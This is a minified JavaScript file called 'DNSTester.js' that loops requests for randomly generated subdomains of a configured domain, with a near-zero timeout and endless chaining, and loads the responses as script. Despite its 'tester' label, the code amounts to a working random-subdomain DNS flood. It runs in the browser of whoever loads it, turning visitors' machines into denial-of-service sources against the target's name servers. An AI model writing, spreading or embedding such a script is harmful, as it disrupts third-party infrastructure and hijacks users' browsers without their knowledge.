/*!
 * DNSTester.js 0.0.2
 * https://github.com/cnbeining/DNSTester.js
 * http://www.cnbeining.com/
 *
 * Includes jQuery
 * http://jquery.com/
 * 
 * Copyright 2015 Beining
 * Released under the GNU GENERAL PUBLIC LICENSE Version 2
 * https://github.com/cnbeining/DNSTester.js/blob/master/LICENSE
 *
 */
function makeid_old(t){for(var e="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=0;t>n;n++)e+=r.charAt(Math.floor(Math.random()*r.length));return e}function makeid_new(t){var e=new Uint8Array((t||40)/2);return window.crypto.getRandomValues(e),text=[].map.call(e,function(t){return t.toString(16)}).join("")}function r_send2(){1!=(1>MAX_COUNT||COUNT>=MAX_COUNT)&&get("https://"+makeid(Math.floor(64*Math.random()+1))+DOMAIN),COUNT%1e3==0&&console.log("Done: "+COUNT.toString())}function get(t){$.ajax({url:t,dataType:"script",timeout:1e-4,cache:!0,complete:function(){COUNT+=1,r_send2()}})}function r_send(t){setTimeout("r_send2()",t)}document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'></script>"),!window.jQuery&&document.write("<script src='https://code.jquery.com/jquery-latest.js'></script>");var COUNT=0,STARTTIME=(new Date).getTime();makeid=makeid_new;try{test_msg=makeid(5)}catch(err){console.log("New function not supported! "+err),makeid=makeid_old}